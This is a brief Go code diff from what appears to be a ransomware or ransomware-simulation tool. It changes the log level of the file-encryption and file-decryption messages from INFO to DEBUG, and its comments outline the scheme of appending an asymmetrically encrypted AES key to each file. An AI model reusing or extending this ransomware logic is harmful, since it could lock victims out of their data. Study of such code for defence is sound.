@@ -395,7 +395,7 @@ func shouldProcessDirectory(d string, config *Config) bool {
 }
 
 func encryptFile(file File, method string, extension string, extensionMethod string, asymHandler AsymKeyHandler, cipher string, encryptThreshold int64, encryptPercentage int) {
-	printFormattedMessage(fmt.Sprintf("Encrypting: "+file.Path), INFO)
+	printFormattedMessage(fmt.Sprintf("Encrypting: "+file.Path), DEBUG)
 	symHandler := SymHandler{
 		System: cipher,
 	}
@@ -554,7 +554,7 @@ func decryptFile(file File, cipher string, asymKeys AsymKeyHandler, group Ransom
 	// First, we read appropriate bytes from end of file backwards to get the ciphertext aes key
 	// Then we decrypt using the privateKey
 	// Then we decrypt file using plain-text symmetric key up to the byte where our key started and truncate from file
-	printFormattedMessage(fmt.Sprintf("Decrypting: "+file.Path), INFO)
+	printFormattedMessage(fmt.Sprintf("Decrypting: "+file.Path), DEBUG)
 	inFile, err := os.Open(file.Path)
 	if err != nil {
 		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
